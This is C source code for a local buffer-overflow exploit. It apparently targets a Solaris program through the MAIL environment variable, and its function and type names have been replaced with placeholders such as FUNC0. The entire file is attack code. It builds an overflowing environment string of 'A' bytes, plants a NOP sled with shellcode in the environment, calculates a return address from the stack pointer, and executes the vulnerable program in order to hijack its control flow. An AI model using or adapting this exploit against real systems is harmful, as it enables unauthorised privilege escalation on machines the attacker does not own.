#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  uid_t ;
typedef  int /*<<< orphan*/  eggbuf ;
typedef  int /*<<< orphan*/  display ;
typedef  int /*<<< orphan*/  buf ;
struct TYPE_3__ {int /*<<< orphan*/  pw_dir; } ;

/* Variables and functions */
 int /*<<< orphan*/  DISPENV ; 
 unsigned int NOP ; 
 int SP ; 
 char* VULPROG ; 
 int /*<<< orphan*/  FUNC0 (char*,int) ; 
 int /*<<< orphan*/  FUNC1 (char*,char**,char**) ; 
 long FUNC2 (long,char**,char**,int) ; 
 int FUNC3 () ; 
 char* FUNC4 (char*,int) ; 
 char* FUNC5 (char*) ; 
 TYPE_1__* FUNC6 (int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC7 () ; 
 int /*<<< orphan*/  FUNC8 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC9 (char*,char,long) ; 
 int /*<<< orphan*/  FUNC10 (char*) ; 
 int /*<<< orphan*/  FUNC11 (char*,...) ; 
 TYPE_1__* pwd ; 
 char* shellcode ; 
 int /*<<< orphan*/  FUNC12 (char*,int,char*,char*) ; 
 char* FUNC13 (int /*<<< orphan*/ ) ; 
 int FUNC14 (char*) ; 
 int /*<<< orphan*/  FUNC15 (char*,int /*<<< orphan*/ ,int) ; 

int
FUNC16(int argc, char **argv)
{
        char            buf[4096], home[128], display[256];
        char            eggbuf[2048];
        long            retaddr, sp_addr = SP;
        char           *arg[24], *env[24], *cwd, *charptr;
        char            padding[64], padding1[64];
        unsigned int   *ptr;
        char           *disp;
        char            ev1[] = "MAIL=";
        long            ev1_len, i, align;
        long            overbuflen = 2048;

        if (argc > 1)
                FUNC12(display, sizeof(display) - 1, "DISPLAY=%s", argv[1]);
        else {
                disp = FUNC5("DISPLAY");
                if (disp)
                        FUNC12(display, sizeof(display) - 1, "DISPLAY=%s", disp);
                else
                        FUNC15(display, DISPENV, sizeof(display) - 1);
        }

        pwd = FUNC6((uid_t) FUNC7());
        FUNC12(home, 127, "HOME=%s", FUNC13(pwd->pw_dir));

        arg[0] = VULPROG;
        arg[1] = NULL;

        cwd = FUNC4((char *) NULL, 256);
        overbuflen = overbuflen - (FUNC14(cwd) + FUNC14("/"));
        ev1_len = FUNC14(ev1);
        FUNC0(buf, sizeof(buf));
        FUNC8(buf, ev1, ev1_len);
        FUNC9(buf + ev1_len, 'A', overbuflen);

        FUNC0(eggbuf, sizeof(eggbuf));
        ptr = (unsigned int *) eggbuf;
        for (i = 0; i < sizeof(eggbuf) - FUNC14(shellcode); i += 4)
                *(ptr + i / 4) = NOP;
        FUNC8(eggbuf + i - 4, shellcode, FUNC14(shellcode));

        env[0] = padding;       /* put padding buffer in env */
        env[1] = eggbuf;        /* put shellcode in env */
        env[2] = padding1;      /* put padding1 buffer in env */
        env[3] = buf;           /* put overflow environ */
        env[4] = display;       /* put display environ */
        env[5] = home;          /* put home environ */
        env[6] = NULL;          /* end of env */

        /* get stack bottom address */
        if (((unsigned char) (FUNC3() >> 24)) == 0xef) {       /* Solaris 2.6 */
                sp_addr = SP - 0x0fbf0000;
        }
        retaddr = FUNC2(sp_addr, arg, env, -8);

        retaddr -= 8;
        FUNC11("Using  return address = 0x%x (shelladdrr - 8)\n", retaddr);
        FUNC11("Click Local in your X window\n\n");

        charptr = (char *) &retaddr;
        align = 4 - ((FUNC14(cwd) + FUNC14("/")) % 4);
        for (i = 0; i < overbuflen - align; i++)
                buf[ev1_len + align + i] = *(charptr + i % 4);


        FUNC1(VULPROG, arg, env);
        FUNC10("execle");
}